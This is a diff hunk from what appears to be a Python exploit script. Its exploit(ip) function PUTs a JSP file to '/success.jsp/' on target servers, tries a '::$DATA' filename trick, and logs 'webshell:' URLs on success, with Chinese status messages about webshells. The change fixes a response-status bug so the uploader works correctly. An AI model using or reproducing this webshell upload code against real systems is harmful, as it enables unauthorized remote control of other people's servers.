@@ -28,9 +28,9 @@ def exploit(ip):
                         url = domain+'/success.jsp/'
                         #url = "/" + str(int(time.time()))+'.jsp::$DATA'
                         resp_put = requests.put(url, data=body)
-                        if resp_put.status  == 201 :
+                        if resp_put.status_code  == 201 :
                             result.append('webshell:'+url[:-1])
-                        elif resp_put.status == 204 :
+                        elif resp_put.status_code == 204 :
                             result.append('%s >>>> 开启了PUT方法且webshell已存在'%domain)
                         else:
                             result.append('%s >>>> 开启了PUT方法'%domain)
